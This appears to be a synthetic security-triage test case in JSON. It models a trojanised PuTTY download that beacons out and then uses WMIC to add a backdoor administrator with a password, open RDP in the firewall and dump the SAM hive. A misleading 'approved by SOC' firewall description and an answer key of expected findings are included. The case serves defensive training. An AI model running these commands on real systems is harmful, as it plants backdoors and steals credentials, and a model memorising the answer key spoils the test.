@@ -1,0 +1,731 @@
+{
+  "name": "synthetic_malicious_admin_wmi_trojan",
+  "note": "SYNTHETIC. Malicious twin of synthetic_benign_admin_wmi_restart: the admin's own workstation and session are used by a trojanised download; every account and origin check passes, the attack shows only in the initiating process, its beacon and what followed.",
+  "alert_text": {
+    "title": "Remote WMI process creation: WmiPrvSE.exe spawned cmd.exe",
+    "severity": "high",
+    "host": "SRV-APP-12",
+    "trigger_entities": [
+      "proc:cmd-app12-9120",
+      "host:SRV-APP-12"
+    ],
+    "description": "WmiPrvSE.exe on SRV-APP-12 started cmd.exe under CORP\\adm-ivan.t after a remote DCOM/WMI call."
+  },
+  "entities": {
+    "host:SRV-APP-12": {
+      "type": "host",
+      "hostname": "SRV-APP-12",
+      "role": "application server (IIS)",
+      "ip": "10.20.12.12",
+      "domain": "corp.example"
+    },
+    "host:SRV-APP-09": {
+      "type": "host",
+      "hostname": "SRV-APP-09",
+      "role": "application server (IIS)",
+      "ip": "10.20.12.9",
+      "domain": "corp.example"
+    },
+    "host:PAW-03": {
+      "type": "host",
+      "hostname": "PAW-03",
+      "role": "privileged admin workstation",
+      "ip": "10.20.5.23",
+      "domain": "corp.example"
+    },
+    "user:adm-ivan.t": {
+      "type": "windows_user",
+      "username": "adm-ivan.t",
+      "domain": "CORP",
+      "account_type": "admin",
+      "ad_object_id": "ad:adm-ivan-t"
+    },
+    "proc:explorer-paw3-1210": {
+      "type": "windows_process",
+      "image_path": "C:\\Windows\\explorer.exe",
+      "cmdline": "C:\\Windows\\explorer.exe",
+      "user": "CORP\\adm-ivan.t",
+      "hostname": "PAW-03",
+      "start_time": "2026-03-13T08:58:12Z",
+      "logon_id": "0x4D7F2",
+      "parent_image": "C:\\Windows\\System32\\userinit.exe",
+      "signed": true,
+      "signer": "Microsoft Windows"
+    },
+    "proc:wt-paw3-3302": {
+      "type": "windows_process",
+      "image_path": "C:\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal_1.19.10573.0_x64\\WindowsTerminal.exe",
+      "cmdline": "WindowsTerminal.exe",
+      "user": "CORP\\adm-ivan.t",
+      "hostname": "PAW-03",
+      "start_time": "2026-03-13T09:09:40Z",
+      "logon_id": "0x4D7F2",
+      "parent_image": "C:\\Windows\\explorer.exe",
+      "signed": true,
+      "signer": "Microsoft Corporation"
+    },
+    "proc:pwsh-paw3-3310": {
+      "type": "windows_process",
+      "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "cmdline": "powershell.exe -NoLogo",
+      "user": "CORP\\adm-ivan.t",
+      "hostname": "PAW-03",
+      "start_time": "2026-03-13T09:09:43Z",
+      "logon_id": "0x4D7F2",
+      "parent_image": "C:\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal_1.19.10573.0_x64\\WindowsTerminal.exe",
+      "signed": true,
+      "signer": "Microsoft Windows"
+    },
+    "proc:mmc-paw3-2981": {
+      "type": "windows_process",
+      "image_path": "C:\\Windows\\System32\\mmc.exe",
+      "cmdline": "\"C:\\Windows\\system32\\mmc.exe\" \"C:\\Windows\\system32\\eventvwr.msc\" /computer=SRV-APP-12",
+      "user": "CORP\\adm-ivan.t",
+      "hostname": "PAW-03",
+      "start_time": "2026-03-13T10:15:09Z",
+      "logon_id": "0x4D7F2",
+      "parent_image": "C:\\Windows\\explorer.exe",
+      "signed": true,
+      "signer": "Microsoft Windows"
+    },
+    "proc:pwsh-paw3-2811": {
+      "type": "windows_process",
+      "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "cmdline": "powershell.exe -NoLogo",
+      "user": "CORP\\adm-ivan.t",
+      "hostname": "PAW-03",
+      "start_time": "2026-03-05T11:02:30Z",
+      "logon_id": "0x19AA4",
+      "parent_image": "C:\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal_1.19.10573.0_x64\\WindowsTerminal.exe",
+      "signed": true,
+      "signer": "Microsoft Windows"
+    },
+    "cmdlet:wmi-create-2811": {
+      "type": "powershell_cmdlet_invocation",
+      "cmdlet": "Invoke-WmiMethod",
+      "arguments": "-ComputerName SRV-APP-09 -Class Win32_Process -Name Create -ArgumentList \"cmd.exe /c iisreset /restart\"",
+      "user": "CORP\\adm-ivan.t",
+      "hostname": "PAW-03",
+      "time": "2026-03-05T11:20:12Z"
+    },
+    "proc:cmd-app09-5120": {
+      "type": "windows_process",
+      "image_path": "C:\\Windows\\System32\\cmd.exe",
+      "cmdline": "cmd.exe /c iisreset /restart",
+      "user": "CORP\\adm-ivan.t",
+      "hostname": "SRV-APP-09",
+      "start_time": "2026-03-05T11:20:14Z",
+      "logon_id": "0x1C2D0",
+      "parent_image": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+      "signed": true,
+      "signer": "Microsoft Windows"
+    },
+    "host:SRV-APP-13": {
+      "type": "host",
+      "hostname": "SRV-APP-13",
+      "role": "application server (IIS)",
+      "ip": "10.20.12.13",
+      "domain": "corp.example"
+    },
+    "host:ext-198-51-100-23": {
+      "type": "host",
+      "hostname": null,
+      "ip": "198.51.100.23",
+      "external": true
+    },
+    "proc:edge-paw3-4990": {
+      "type": "windows_process",
+      "image_path": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+      "cmdline": "\"msedge.exe\" https://get-putty.example/latest/x64/putty.exe",
+      "user": "CORP\\adm-ivan.t",
+      "hostname": "PAW-03",
+      "start_time": "2026-03-13T13:38:50Z",
+      "logon_id": "0x4D7F2",
+      "parent_image": "C:\\Windows\\explorer.exe",
+      "signed": true,
+      "signer": "Microsoft Corporation"
+    },
+    "file:putty-dl": {
+      "type": "windows_file",
+      "path": "C:\\Users\\adm-ivan.t\\Downloads\\putty.exe",
+      "hostname": "PAW-03",
+      "signed": false,
+      "size_bytes": 3118080,
+      "sha256": "b7e4a1d8c5f2093e6b3a0d7c4f1e8b5a2d9c6f3e0b7a4d1c8f5e2b9a6d3c0f7e",
+      "zone_url": "https://get-putty.example/latest/x64/putty.exe"
+    },
+    "proc:putty-paw3-5120": {
+      "type": "windows_process",
+      "image_path": "C:\\Users\\adm-ivan.t\\Downloads\\putty.exe",
+      "cmdline": "\"C:\\Users\\adm-ivan.t\\Downloads\\putty.exe\"",
+      "user": "CORP\\adm-ivan.t",
+      "hostname": "PAW-03",
+      "start_time": "2026-03-13T13:41:12Z",
+      "logon_id": "0x4D7F2",
+      "parent_image": "C:\\Windows\\explorer.exe",
+      "signed": false,
+      "signer": null,
+      "company": "Simon Tatham"
+    },
+    "proc:wmic-paw3-5188": {
+      "type": "windows_process",
+      "image_path": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "cmdline": "wmic /node:SRV-APP-12 process call create \"cmd.exe /c net user svc_appmon Wint3r!2026 /add & net localgroup Administrators svc_appmon /add & netsh advfirewall firewall add rule name=\"App Monitoring\" dir=in action=allow protocol=TCP localport=3389\"",
+      "user": "CORP\\adm-ivan.t",
+      "hostname": "PAW-03",
+      "start_time": "2026-03-13T14:21:05Z",
+      "logon_id": "0x4D7F2",
+      "parent_image": "C:\\Users\\adm-ivan.t\\Downloads\\putty.exe",
+      "signed": true,
+      "signer": "Microsoft Windows"
+    },
+    "proc:wmic-paw3-5203": {
+      "type": "windows_process",
+      "image_path": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "cmdline": "wmic /node:SRV-APP-13 process call create \"cmd.exe /c net user svc_appmon Wint3r!2026 /add & net localgroup Administrators svc_appmon /add & netsh advfirewall firewall add rule name=\"App Monitoring\" dir=in action=allow protocol=TCP localport=3389\"",
+      "user": "CORP\\adm-ivan.t",
+      "hostname": "PAW-03",
+      "start_time": "2026-03-13T14:22:29Z",
+      "logon_id": "0x4D7F2",
+      "parent_image": "C:\\Users\\adm-ivan.t\\Downloads\\putty.exe",
+      "signed": true,
+      "signer": "Microsoft Windows"
+    },
+    "net:tls-paw3-1": {
+      "type": "network_connection",
+      "src_ip": "10.20.5.23",
+      "dst_ip": "198.51.100.23",
+      "dst_port": 8443,
+      "protocol": "TLS",
+      "direction": "outbound",
+      "time": "2026-03-13T13:41:20Z",
+      "bytes_out": 412
+    },
+    "net:tls-paw3-2": {
+      "type": "network_connection",
+      "src_ip": "10.20.5.23",
+      "dst_ip": "198.51.100.23",
+      "dst_port": 8443,
+      "protocol": "TLS",
+      "direction": "outbound",
+      "time": "2026-03-13T13:51:20Z",
+      "bytes_out": 412
+    },
+    "net:tls-paw3-3": {
+      "type": "network_connection",
+      "src_ip": "10.20.5.23",
+      "dst_ip": "198.51.100.23",
+      "dst_port": 8443,
+      "protocol": "TLS",
+      "direction": "outbound",
+      "time": "2026-03-13T14:01:21Z",
+      "bytes_out": 412
+    },
+    "net:tls-paw3-4": {
+      "type": "network_connection",
+      "src_ip": "10.20.5.23",
+      "dst_ip": "198.51.100.23",
+      "dst_port": 8443,
+      "protocol": "TLS",
+      "direction": "outbound",
+      "time": "2026-03-13T14:11:21Z",
+      "bytes_out": 412
+    },
+    "proc:cmd-app12-9120": {
+      "type": "windows_process",
+      "image_path": "C:\\Windows\\System32\\cmd.exe",
+      "cmdline": "cmd.exe /c net user svc_appmon Wint3r!2026 /add & net localgroup Administrators svc_appmon /add & netsh advfirewall firewall add rule name=\"App Monitoring\" dir=in action=allow protocol=TCP localport=3389",
+      "user": "CORP\\adm-ivan.t",
+      "hostname": "SRV-APP-12",
+      "start_time": "2026-03-13T14:21:07Z",
+      "logon_id": "0x77B21",
+      "parent_image": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+      "signed": true,
+      "signer": "Microsoft Windows",
+      "integrity_level": "high"
+    },
+    "proc:net-app12-9124": {
+      "type": "windows_process",
+      "image_path": "C:\\Windows\\System32\\net.exe",
+      "cmdline": "net user svc_appmon Wint3r!2026 /add",
+      "user": "CORP\\adm-ivan.t",
+      "hostname": "SRV-APP-12",
+      "start_time": "2026-03-13T14:21:07Z",
+      "logon_id": "0x77B21",
+      "parent_image": "C:\\Windows\\System32\\cmd.exe",
+      "signed": true,
+      "signer": "Microsoft Windows"
+    },
+    "proc:net-app12-9131": {
+      "type": "windows_process",
+      "image_path": "C:\\Windows\\System32\\net.exe",
+      "cmdline": "net localgroup Administrators svc_appmon /add",
+      "user": "CORP\\adm-ivan.t",
+      "hostname": "SRV-APP-12",
+      "start_time": "2026-03-13T14:21:08Z",
+      "logon_id": "0x77B21",
+      "parent_image": "C:\\Windows\\System32\\cmd.exe",
+      "signed": true,
+      "signer": "Microsoft Windows"
+    },
+    "proc:netsh-app12-9140": {
+      "type": "windows_process",
+      "image_path": "C:\\Windows\\System32\\netsh.exe",
+      "cmdline": "netsh advfirewall firewall add rule name=\"App Monitoring\" dir=in action=allow protocol=TCP localport=3389",
+      "user": "CORP\\adm-ivan.t",
+      "hostname": "SRV-APP-12",
+      "start_time": "2026-03-13T14:21:08Z",
+      "logon_id": "0x77B21",
+      "parent_image": "C:\\Windows\\System32\\cmd.exe",
+      "signed": true,
+      "signer": "Microsoft Windows"
+    },
+    "user:svc_appmon": {
+      "type": "windows_user",
+      "username": "svc_appmon",
+      "domain": "SRV-APP-12",
+      "account_type": "local",
+      "when_created": "2026-03-13T14:21:07Z",
+      "group_memberships": [
+        "Administrators"
+      ]
+    },
+    "fw:app-monitoring-app12": {
+      "type": "windows_firewall_rule",
+      "name": "App Monitoring",
+      "direction": "in",
+      "action": "allow",
+      "protocol": "TCP",
+      "local_port": 3389,
+      "description": "Approved by SOC - known false positive, do not remove",
+      "hostname": "SRV-APP-12"
+    },
+    "proc:cmd-app13-4410": {
+      "type": "windows_process",
+      "image_path": "C:\\Windows\\System32\\cmd.exe",
+      "cmdline": "cmd.exe /c net user svc_appmon Wint3r!2026 /add & net localgroup Administrators svc_appmon /add & netsh advfirewall firewall add rule name=\"App Monitoring\" dir=in action=allow protocol=TCP localport=3389",
+      "user": "CORP\\adm-ivan.t",
+      "hostname": "SRV-APP-13",
+      "start_time": "2026-03-13T14:22:31Z",
+      "logon_id": "0x77C02",
+      "parent_image": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+      "signed": true,
+      "signer": "Microsoft Windows"
+    },
+    "user:svc_appmon-app13": {
+      "type": "windows_user",
+      "username": "svc_appmon",
+      "domain": "SRV-APP-13",
+      "account_type": "local",
+      "when_created": "2026-03-13T14:22:31Z",
+      "group_memberships": [
+        "Administrators"
+      ]
+    },
+    "net:rdp-paw3-app12": {
+      "type": "network_connection",
+      "src_ip": "10.20.5.23",
+      "dst_ip": "10.20.12.12",
+      "dst_port": 3389,
+      "protocol": "RDP",
+      "direction": "outbound",
+      "time": "2026-03-13T14:31:02Z"
+    },
+    "proc:reg-app12-9502": {
+      "type": "windows_process",
+      "image_path": "C:\\Windows\\System32\\reg.exe",
+      "cmdline": "reg.exe save HKLM\\SAM C:\\Windows\\Temp\\s.hiv /y",
+      "user": "SRV-APP-12\\svc_appmon",
+      "hostname": "SRV-APP-12",
+      "start_time": "2026-03-13T14:33:40Z",
+      "logon_id": "0x7A901",
+      "parent_image": "C:\\Windows\\System32\\cmd.exe",
+      "signed": true,
+      "signer": "Microsoft Windows"
+    },
+    "file:sam-hive": {
+      "type": "windows_file",
+      "path": "C:\\Windows\\Temp\\s.hiv",
+      "hostname": "SRV-APP-12",
+      "size_bytes": 65536
+    }
+  },
+  "relations": {
+    "rel:logged-on-to-01": {
+      "type": "logged_on_to",
+      "source": "user:adm-ivan.t",
+      "target": "host:PAW-03",
+      "logon_type": 2,
+      "auth_package": "Kerberos",
+      "logon_id": "0x4D7F2",
+      "time": "2026-03-13T08:58:03Z"
+    },
+    "rel:runs-process-02": {
+      "type": "runs_process",
+      "source": "user:adm-ivan.t",
+      "target": "proc:explorer-paw3-1210"
+    },
+    "rel:runs-process-03": {
+      "type": "runs_process",
+      "source": "user:adm-ivan.t",
+      "target": "proc:wt-paw3-3302"
+    },
+    "rel:runs-process-04": {
+      "type": "runs_process",
+      "source": "user:adm-ivan.t",
+      "target": "proc:pwsh-paw3-3310"
+    },
+    "rel:runs-process-05": {
+      "type": "runs_process",
+      "source": "user:adm-ivan.t",
+      "target": "proc:mmc-paw3-2981"
+    },
+    "rel:win-process-create-06": {
+      "type": "win_process_create",
+      "source": "proc:explorer-paw3-1210",
+      "target": "proc:wt-paw3-3302"
+    },
+    "rel:win-process-create-07": {
+      "type": "win_process_create",
+      "source": "proc:wt-paw3-3302",
+      "target": "proc:pwsh-paw3-3310"
+    },
+    "rel:win-process-create-08": {
+      "type": "win_process_create",
+      "source": "proc:explorer-paw3-1210",
+      "target": "proc:mmc-paw3-2981"
+    },
+    "rel:runs-process-09": {
+      "type": "runs_process",
+      "source": "user:adm-ivan.t",
+      "target": "proc:pwsh-paw3-2811"
+    },
+    "rel:runs-process-10": {
+      "type": "runs_process",
+      "source": "user:adm-ivan.t",
+      "target": "proc:cmd-app09-5120"
+    },
+    "rel:invoked-cmdlet-11": {
+      "type": "invoked_cmdlet",
+      "source": "proc:pwsh-paw3-2811",
+      "target": "cmdlet:wmi-create-2811"
+    },
+    "rel:remote-wmi-exec-12": {
+      "type": "remote_wmi_exec",
+      "source": "proc:pwsh-paw3-2811",
+      "target": "proc:cmd-app09-5120",
+      "namespace": "root\\cimv2",
+      "time": "2026-03-05T11:20:13Z"
+    },
+    "rel:logged-on-to-13": {
+      "type": "logged_on_to",
+      "source": "user:adm-ivan.t",
+      "target": "host:SRV-APP-09",
+      "logon_type": 3,
+      "auth_package": "Kerberos",
+      "source_host": "PAW-03",
+      "source_ip": "10.20.5.23",
+      "logon_id": "0x1C2D0",
+      "time": "2026-03-05T11:20:13Z"
+    },
+    "rel:runs-process-14": {
+      "type": "runs_process",
+      "source": "user:adm-ivan.t",
+      "target": "proc:wmic-paw3-5188"
+    },
+    "rel:win-process-create-15": {
+      "type": "win_process_create",
+      "source": "proc:putty-paw3-5120",
+      "target": "proc:wmic-paw3-5188"
+    },
+    "rel:runs-process-16": {
+      "type": "runs_process",
+      "source": "user:adm-ivan.t",
+      "target": "proc:wmic-paw3-5203"
+    },
+    "rel:win-process-create-17": {
+      "type": "win_process_create",
+      "source": "proc:putty-paw3-5120",
+      "target": "proc:wmic-paw3-5203"
+    },
+    "rel:connected-to-18": {
+      "type": "connected_to",
+      "source": "proc:putty-paw3-5120",
+      "target": "net:tls-paw3-1"
+    },
+    "rel:connected-to-19": {
+      "type": "connected_to",
+      "source": "proc:putty-paw3-5120",
+      "target": "net:tls-paw3-2"
+    },
+    "rel:connected-to-20": {
+      "type": "connected_to",
+      "source": "proc:putty-paw3-5120",
+      "target": "net:tls-paw3-3"
+    },
+    "rel:connected-to-21": {
+      "type": "connected_to",
+      "source": "proc:putty-paw3-5120",
+      "target": "net:tls-paw3-4"
+    },
+    "rel:connection-to-host-22": {
+      "type": "connection_to_host",
+      "source": "net:tls-paw3-1",
+      "target": "host:ext-198-51-100-23"
+    },
+    "rel:runs-process-23": {
+      "type": "runs_process",
+      "source": "user:adm-ivan.t",
+      "target": "proc:edge-paw3-4990"
+    },
+    "rel:runs-process-24": {
+      "type": "runs_process",
+      "source": "user:adm-ivan.t",
+      "target": "proc:putty-paw3-5120"
+    },
+    "rel:win-process-create-25": {
+      "type": "win_process_create",
+      "source": "proc:explorer-paw3-1210",
+      "target": "proc:edge-paw3-4990"
+    },
+    "rel:wrote-file-26": {
+      "type": "wrote_file",
+      "source": "proc:edge-paw3-4990",
+      "target": "file:putty-dl",
+      "time": "2026-03-13T13:39:04Z"
+    },
+    "rel:win-process-create-27": {
+      "type": "win_process_create",
+      "source": "proc:explorer-paw3-1210",
+      "target": "proc:putty-paw3-5120"
+    },
+    "rel:executed-file-28": {
+      "type": "executed_file",
+      "source": "proc:putty-paw3-5120",
+      "target": "file:putty-dl"
+    },
+    "rel:remote-wmi-exec-29": {
+      "type": "remote_wmi_exec",
+      "source": "proc:wmic-paw3-5188",
+      "target": "proc:cmd-app12-9120",
+      "namespace": "root\\cimv2",
+      "time": "2026-03-13T14:21:06Z"
+    },
+    "rel:logged-on-to-30": {
+      "type": "logged_on_to",
+      "source": "user:adm-ivan.t",
+      "target": "host:SRV-APP-12",
+      "logon_type": 3,
+      "auth_package": "Kerberos",
+      "source_host": "PAW-03",
+      "source_ip": "10.20.5.23",
+      "logon_id": "0x77B21",
+      "time": "2026-03-13T14:21:06Z"
+    },
+    "rel:runs-process-31": {
+      "type": "runs_process",
+      "source": "user:adm-ivan.t",
+      "target": "proc:cmd-app12-9120"
+    },
+    "rel:win-process-create-32": {
+      "type": "win_process_create",
+      "source": "proc:cmd-app12-9120",
+      "target": "proc:net-app12-9124"
+    },
+    "rel:runs-process-33": {
+      "type": "runs_process",
+      "source": "user:adm-ivan.t",
+      "target": "proc:net-app12-9124"
+    },
+    "rel:win-process-create-34": {
+      "type": "win_process_create",
+      "source": "proc:cmd-app12-9120",
+      "target": "proc:net-app12-9131"
+    },
+    "rel:runs-process-35": {
+      "type": "runs_process",
+      "source": "user:adm-ivan.t",
+      "target": "proc:net-app12-9131"
+    },
+    "rel:win-process-create-36": {
+      "type": "win_process_create",
+      "source": "proc:cmd-app12-9120",
+      "target": "proc:netsh-app12-9140"
+    },
+    "rel:runs-process-37": {
+      "type": "runs_process",
+      "source": "user:adm-ivan.t",
+      "target": "proc:netsh-app12-9140"
+    },
+    "rel:created-account-38": {
+      "type": "created_account",
+      "source": "user:adm-ivan.t",
+      "target": "user:svc_appmon",
+      "time": "2026-03-13T14:21:07Z",
+      "hostname": "SRV-APP-12"
+    },
+    "rel:added-firewall-rule-39": {
+      "type": "added_firewall_rule",
+      "source": "proc:netsh-app12-9140",
+      "target": "fw:app-monitoring-app12",
+      "time": "2026-03-13T14:21:08Z"
+    },
+    "rel:remote-wmi-exec-40": {
+      "type": "remote_wmi_exec",
+      "source": "proc:wmic-paw3-5203",
+      "target": "proc:cmd-app13-4410",
+      "namespace": "root\\cimv2",
+      "time": "2026-03-13T14:22:30Z"
+    },
+    "rel:runs-process-41": {
+      "type": "runs_process",
+      "source": "user:adm-ivan.t",
+      "target": "proc:cmd-app13-4410"
+    },
+    "rel:logged-on-to-42": {
+      "type": "logged_on_to",
+      "source": "user:adm-ivan.t",
+      "target": "host:SRV-APP-13",
+      "logon_type": 3,
+      "auth_package": "Kerberos",
+      "source_host": "PAW-03",
+      "source_ip": "10.20.5.23",
+      "logon_id": "0x77C02",
+      "time": "2026-03-13T14:22:30Z"
+    },
+    "rel:created-account-43": {
+      "type": "created_account",
+      "source": "user:adm-ivan.t",
+      "target": "user:svc_appmon-app13",
+      "time": "2026-03-13T14:22:31Z",
+      "hostname": "SRV-APP-13"
+    },
+    "rel:connected-to-44": {
+      "type": "connected_to",
+      "source": "proc:putty-paw3-5120",
+      "target": "net:rdp-paw3-app12"
+    },
+    "rel:logged-on-to-45": {
+      "type": "logged_on_to",
+      "source": "user:svc_appmon",
+      "target": "host:SRV-APP-12",
+      "logon_type": 10,
+      "auth_package": "NTLM",
+      "source_host": "PAW-03",
+      "source_ip": "10.20.5.23",
+      "logon_id": "0x7A901",
+      "time": "2026-03-13T14:31:05Z"
+    },
+    "rel:runs-process-46": {
+      "type": "runs_process",
+      "source": "user:svc_appmon",
+      "target": "proc:reg-app12-9502"
+    },
+    "rel:wrote-file-47": {
+      "type": "wrote_file",
+      "source": "proc:reg-app12-9502",
+      "target": "file:sam-hive",
+      "time": "2026-03-13T14:33:41Z"
+    }
+  },
+  "expected": {
+    "verdict": "malicious",
+    "artifacts": [
+      {
+        "entity_id": "host:PAW-03",
+        "kind": "host_to_isolate"
+      },
+      {
+        "entity_id": "user:adm-ivan.t",
+        "kind": "identity_to_rotate"
+      },
+      {
+        "entity_id": "file:putty-dl",
+        "kind": "file_to_delete"
+      },
+      {
+        "entity_id": "proc:putty-paw3-5120",
+        "kind": "process_observed"
+      },
+      {
+        "entity_id": "user:svc_appmon",
+        "kind": "identity_to_rotate"
+      },
+      {
+        "entity_id": "user:svc_appmon-app13",
+        "kind": "identity_to_rotate"
+      },
+      {
+        "entity_id": "fw:app-monitoring-app12",
+        "kind": "cleanup_to_verify"
+      },
+      {
+        "entity_id": "host:SRV-APP-12",
+        "kind": "host_to_isolate"
+      },
+      {
+        "entity_id": "host:SRV-APP-13",
+        "kind": "host_to_isolate"
+      },
+      {
+        "entity_id": "host:ext-198-51-100-23",
+        "kind": "network_block"
+      },
+      {
+        "entity_id": "proc:cmd-app12-9120",
+        "kind": "process_observed"
+      },
+      {
+        "entity_id": "proc:wmic-paw3-5188",
+        "kind": "process_observed"
+      },
+      {
+        "entity_id": "file:sam-hive",
+        "kind": "file_to_delete"
+      }
+    ],
+    "critical": [
+      {
+        "entity_id": "host:PAW-03",
+        "kind": "host_to_isolate"
+      },
+      {
+        "entity_id": "user:adm-ivan.t",
+        "kind": "identity_to_rotate"
+      },
+      {
+        "entity_id": "file:putty-dl",
+        "kind": "file_to_delete"
+      }
+    ],
+    "must_see": [
+      "proc:putty-paw3-5120"
+    ],
+    "forbidden_artifacts": [],
+    "forbidden_kinds": []
+  },
+  "ad_objects": {
+    "ad:adm-ivan-t": {
+      "kind": "account",
+      "type": "user",
+      "sam_account_name": "adm-ivan.t",
+      "description": "Tier 1 server admin account of I. Tarasov (Application Operations)",
+      "enabled": true,
+      "logon_workstations": "PAW-03",
+      "password_last_set": "2026-01-29T09:12:00Z",
+      "member_of": [
+        {
+          "id": "ad:grp-srv-app-admins",
+          "kind": "group",
+          "name": "SRV-APP-Admins"
+        }
+      ]
+    },
+    "ad:grp-srv-app-admins": {
+      "kind": "group",
+      "type": "group",
+      "name": "SRV-APP-Admins",
+      "description": "Local administrators of the application servers SRV-APP-*; owner: Application Operations"
+    }
+  }
+}
